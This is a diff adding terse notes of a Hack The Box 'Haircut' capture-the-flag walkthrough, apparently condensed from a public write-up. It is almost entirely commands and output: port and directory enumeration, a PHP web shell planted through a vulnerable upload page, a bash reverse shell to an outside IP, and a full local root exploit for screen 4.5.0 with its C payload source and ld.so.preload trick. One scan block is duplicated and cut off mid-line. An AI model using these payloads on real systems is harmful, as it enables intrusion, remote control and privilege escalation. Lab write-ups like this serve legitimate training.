@@ -1,0 +1,144 @@
+let's enumerate:
+command: sudo rustscan -a 10.10.10.24
+result:
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+command: sudo nmap -sSVC -A -p 22,80 10.10.10.24
+result:
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
+|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
+|_  256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
+80/tcp open  http    nginx 1.10.0 (Ubuntu)
+|_http-title:  HTB Hairdresser 
+|_http-server-header: nginx/1.10.0 (Ubuntu)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Aggressive OS guesses: Linux 3.13 (96%), Linux 3.16 (96%), Linux 3.2 - 4.9 (96%), Linux 4.8 (96%), Linux 4.4 (95%), Linux 4.9 (95%), Linux 3.12 (95%), Linux 3.18 (95%), Linux 3.8 - 3.11 (95%), Linux 4.2 (95%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+command: sudo nmap -sSVC -A -p 22,80 10.10.10.24
+result:
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e9:75:c1:e4:b3:63:3c:93:f2:c6:18:08:36:48:ce:36 (RSA)
+|   256 87:00:ab:a9:8f:6f:4b:ba:fb:c6:7a:55:a8:60:b2:68 (ECDSA)
+|_  256 b6:1b:5c:a9:26:5c:dc:61:b7:75:90:6c:88:51:6e:54 (ED25519)
+80/tcp open  http    nginx 1.10.0 (Ubuntu)
+|_http-title:  HTB Hairdresser 
+|_http-server-header: nginx/1.10.0 (Ubuntu)
+Warning: OSScan results may be unreliable because
+
+command: gobuster dir -u http://10.10.10.24 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 40 -x php 
+result:
+/uploads              (Status: 301) [Size: 194] [--> http://10.10.10.24/uploads/]
+/exposed.php          (Status: 200) [Size: 446]
+
+command: echo '<?php system($_REQUEST["cmd"]); ?>' > payload.php
+command: python3 -m http.server 7979
+access: http://10.10.10.24/exposed.php
+input: http://10.10.16.14:7979/payload.php -o uploads/0xdf.php
+
+command: curl http://10.10.10.24/uploads/0xdf.php?cmd=id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+command: nc -lvnp 7979
+command: curl -G http://10.10.10.24/uploads/0xdf.php --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.16.14/7979 0>&1'"
+command: /home/maria/Desktop
+command: cat user.txt
+result:
+0b0da2af50e9ab7c81a6ec2c562afeae
+
+command: find / -perm -4000 -o -perm -2000 -type f 2>/dev/null
+result:
+/bin/ntfs-3g
+/bin/ping6
+/bin/fusermount
+/bin/su
+/bin/mount
+/bin/ping
+/bin/umount
+/sbin/unix_chkpwd
+/sbin/pam_extrausers_chkpwd
+/usr/bin/sudo
+/usr/bin/mlocate
+/usr/bin/pkexec
+/usr/bin/chage
+/usr/bin/screen.old
+/usr/bin/newuidmap
+/usr/bin/crontab
+/usr/bin/bsd-write
+/usr/bin/newgrp
+/usr/bin/newgidmap
+/usr/bin/expiry
+/usr/bin/gpasswd
+/usr/bin/ssh-agent
+/usr/bin/at
+/usr/bin/passwd
+/usr/bin/screen-4.5.0
+/usr/bin/chsh
+/usr/bin/wall
+/usr/bin/chfn
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/x86_64-linux-gnu/utempter/utempter
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+
+take attention:
+/usr/bin/screen-4.5.0
+
+read this exploit:
+https://www.exploit-db.com/exploits/41154
+
+command: cd /tmp
+
+libhax.c code:
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown("/tmp/rootshell", 0, 0);
+    chmod("/tmp/rootshell", 04755);
+    unlink("/etc/ld.so.preload");
+    printf("[+] done!\n");
+}
+
+command: gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
+
+rootshell code: 
+
+#include <stdio.h>
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp("/bin/sh", NULL, NULL);
+}
+
+please compile in ldd glibc 2.23 VERSION
+ubuntu 16.04
+and upload using this 
+https://filebin.net/zcm0cqpiuxcza5k0
+command: gcc rootshell.c -o rootshell
+
+command: cd /etc
+command: umask 000
+command: screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
+command: cd /tmp && chmod +x rootshell
+command: ./rootshell
+command: id && whoami
+f49fff5620bd30df6d1753cc43578815
+
+resource:
+https://0xdf.gitlab.io/2020/09/10/htb-haircut.html
